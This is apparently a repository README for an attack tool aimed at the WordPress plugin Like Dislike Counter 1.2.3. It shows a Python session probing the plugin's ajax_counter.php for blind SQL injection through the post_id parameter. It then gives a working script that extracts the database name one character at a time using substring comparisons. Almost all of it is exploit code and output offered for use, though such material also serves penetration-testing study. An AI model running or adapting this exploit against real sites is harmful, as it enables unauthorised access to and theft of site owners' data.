# Like-Dislike-Counter-AttackTool  

### python 2.7.6  
### Module : requests  
### Target : Like Dislike Counter 1.2.3  
### Reference  
> [Noplanlife.com](http://noplanlife.com/?p=1339)  
> [Requests: HTTP for Humans](http://docs.python-requests.org/en/latest/)  
> [MKSecurity](http://www.muratkaya.com.tr/2017/02/21/very-simple-blind-sql-injection-python-2-7-x-script-template-for-peneteration-testers/)  

##### Blind SQL Injection 반응검사  
<pre><code>
>>> import requests
>>> url = "http://192.168.28.130/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php"
>>> payload1 = {'post_id' : '12 and 1=1', 'up_type' : 'like'}     # Expected Result is 1
>>> payload2 = {'post_id' : '12 and 1=2', 'up_type' : 'like'}     # Expected Result is 0
>>> r1 = requests.post(url, data = payload1)
>>> r2 = requests.post(url, data = payload2)
>>> r1.content
'1'
>>> r2.content
'0'
>>> print int(r1.content)
1
>>> print int(r2.content)
0
</code></pre>



###### It's a python 
<pre><code>
    import requests  
    import string  
    
    url = input("Input Target URL : ")

    if(url.startswith('http://') != 1) :
            url = "http://" + url

    dbName = []

    for x in range(1,11) :
            for y in range(32,127) :
                    #print 'x = '+str(x)+'   y = '+str(y)
                    brute_string = '12 and substring(database(),'+str(x)+',1) = char('+str(y)+')'
                    payload = {'post_id' : brute_string, 'up_type' : 'like'}
                    r = requests.post(url, data = payload)
                    blindRes = int(r.content)
    
                    if blindRes :
                            #print "The "+str(x)+"th word is : "+str(y)
                            dbName.append(chr(y))
                            break
    print dbName
</code></pre>
